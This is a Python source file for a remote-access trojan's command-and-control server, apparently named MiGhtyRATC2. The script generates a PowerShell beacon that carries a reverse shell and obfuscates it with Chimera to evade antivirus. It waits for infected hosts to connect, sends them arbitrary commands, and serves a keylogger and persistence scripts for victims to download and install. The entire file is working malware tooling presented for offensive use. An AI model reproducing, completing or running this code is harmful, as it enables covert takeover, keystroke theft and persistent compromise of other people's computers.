#!/usr/bin/env python

import socket
import time
import os
from _thread import *

def initializeEnvironment():
	print("[!] WARNING MUST BE RUN AS ROOT")
	print("[+] Checking for Installation directory of chmeria")

	if(os.path.exists("Chimera/")):
		print("[+] Chimera FOUND")

	else:
		print("[!] ERROR - Chimera Obfuscator NOT FOUND exiting....")
		quit()

	print("[+] Checking for reverse shell database")


	if(os.path.exists("Shells/")):
		print("[+] Shell Database FOUND")
	else:
		print("[!] Shell Dabasebse NOT FOUND exiting....")
		quit()


	print("[+] Checking for beacon database")

	if(os.path.exists("Beacons/")):
		print("[+] Beacon Database FOUND")

	else:
		print("[!] ERROR - Beacon Database NOT FOUND exiting...")
		quit()

	print("[+] ALL GOOD ")
	time.sleep(1)
	os.system("clear")



def genBeacon():

		lhost = input("[+] Enter PAYLOAD LHOST: ")
		lport = input("[+] Enter PAYLOAD LPORT: ")

		# read powershell payload and replace LHOST / PORT

		with open("Shells/shell.ps1", "r") as payloadFile:
			payloadFileData = payloadFile.read()

			payloadFileData = payloadFileData.replace("*1", lhost)
			payloadFileData = payloadFileData.replace("*2", lport)



			# GOTO ME
			# read contents of Beacon.ps1 and replace lhost / port / payload in it from shell.ps1 file
			# NOTE: MAKE C2 beacon comms diff from payload socket otherwise connection cant be made

		with open("Beacons/MiGhtyBeacon.ps1", "r") as beaconFile:

			beaconLHOST = input("[+] Enter Beacon LHOST: ")
			beaconLPORT = input("[+] Enter Beacon LPORT: ")
				# read contents of entire file
			beaconFileData = beaconFile.read()


				# replace *1 / *2 with specified lhost /port for C2 communications
			beaconFileData = beaconFileData.replace("*1", beaconLHOST)
			beaconFileData = beaconFileData.replace("*2", beaconLPORT)

			# replace *3 with the modified contents of shell.ps1 payloadfile for reverse shell
			beaconFileData = beaconFileData.replace("*3", payloadFileData)


		# write all modified data to Beacon_Output.ps1 file
		with open("Output/Beacon_Output.ps1", "w") as outputBeaconFile:
			outputBeaconFile.write(beaconFileData)

		# check if path exists, if it does obfuscate the beacon with chimera

		if(os.path.exists("Output/Beacon_Output.ps1")):
			# obfuscate the beacon with chimera
			os.system("clear")
			print("[+] Obfuscating Beacon Please Wait....")
			os.system("cd Chimera && ./chimera.sh --file /root/MiGhtyRATC2/Output/Beacon_Output.ps1 -a -o /root/MiGhtyRATC2/Output/Final_Beacon.ps1 >/dev/null 2>&1")
			os.system("clear")

			# check if final beacon exists
			if(os.path.exists("/root/MiGhtyRATC2/Output/Final_Beacon.ps1")):
				# clean up output files
				os.system("rm /root/MiGhtyRATC2/Output/Beacon_Output.ps1")






def getCommand(s, conn, addr, host):
	command = ""
	while command != "exit":
		print("")
		command = input("MiGhtyRAT> ")

		if command == "help":
			print("---------------------------------COMMANDS-------------------------")
			print("[+] shell: tell beacon to open reverse shell to C2")
			print("[+] command:<cmd/powershell command to be executed by the becon>")
			print("")
			print("-------------------------INSTALLATION COMMANDS--------------------")
			print("[+] install:keylogger - beacon downloads keylogger from C2")
			print("[+] install:persistence - beacon downloads persistence mechanism and installs it")
			print("[+] install:<filename> - installs specified file onto beacon host from /var/www/html")
			print("")
			print("------------------------------TO EXIT----------------------------")
			print("[+] exit: close MiGhtyRATC2 session")
			print("------------------------------------------------------------------")


		if command == "shell":

			print("[+] Sending Command...")
			conn.sendall(b"shell\n")
			# setup reverse shell listener
			# send "command:<beacon IP>:shell down socket connectioion
			# catch shell from specified beacon


		# if attacker specifies command: syntax send entire command down socket connection to beacon
		if "command:" in command:

			# send command down tcp socket connection to beacon
			print("[+] Sending Command...")
			command += "\n"
			conn.sendall(command.encode())

			# GOTO ME, read until beacon sends \end
			commandOutput = conn.recv(65535)

			commandOutput = str(commandOutput)

			commandOutput = commandOutput.strip()
			commandOutput = commandOutput.rstrip()

			print(commandOutput)
			# listen for response holding command results


		# GOTO ME
		if command == "install:keylogger":
			# GOTOME
			os.system("cp /root/MiGhtyRATC2/Payloads/keylogger.ps1 /var/www/html")
			os.system("cp /root/MiGhtyRATC2/Payloads/persistenceK.bat /var/www/html")

			print("[+] Starting Apache...")
			try:
				os.system("service apache2 start")
			except:
				print("[+] ERROR - Starting Apache FAILED")


			print("[+] Serving http://" + host + "/keylogger.ps1")
			print("[+] Serving http://" + host + "/persistenceK.bat")

			conn.sendall(b"install:keylogger\n")



		if command == "install:persistence":
			print("[+] Serving http://" + host + "/Final_Beacon.ps1")
			print("[+] Serving http://" + host + "/persistenceB.bat")

			try:
				os.system("service apache2 start")
			except:
				print("[+] ERROR - starting apache FAILED")

			os.system("cp /root/MiGhtyRATC2/Output/Final_Beacon.ps1 /var/www/html")
			os.system("cp /root/MiGhtyRATC2/Payloads/persistenceB.bat /var/www/html")

			conn.sendall(b"install:persistence\n")



		if "install:" in command:

			os.system("service apache2 start")
			print("[!] WARNING - Ensure File Is In /var/www/html")

			conn.sendall((command + "\n").encode())

			command = command.replace("install:", "")
			print("[+] Serving http://" + host + "/" + command)


	# once while loop broken program reinters listenSocket()
	print("[+] Shutting Down...")


def listenSocket():

	threadCount = 0
	# IF new beaconLHOST / beaconLPORT not specified crash because theese values not defined
	# CHANGE ME TO USER SPECIFIED
	host = "10.0.0.50"

	# CHANGE ME TO USER SPECIFIED
	port = 8080

	s = socket.socket()
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((host, port))

	# MULTITHREAD ME
	s.listen(100000)
	print("[+] Waiting for Beacons.....")

	conn,addr = s.accept()
	count = 0


	while True:


		# send server initialization message to beacon
		# GOTO ME
		conn.sendall(b"Hello\n")

		# read data from socket
		data = conn.recv(1024)
		if not data: break

		# if data read from socket is beacon mesage "Hello" ask user for command
		if data == b"Hello":
			count = count + 1
			print("[+] Beacon " + str(count) + ": " + str(addr))

			getCommand(s, conn, addr, host)

		break
	s.close()
	conn.close()
	quit()

initializeEnvironment()
genBeacon()
listenSocket()


#TO DO:
	# Multithread server for multiple beacons simultaneously
	# fix command:dir formatting
	# "persistence" command on beacon
	# "keylogger" command on beacon
	# fix host / port static variables
	# test against av when file is connected to public IP
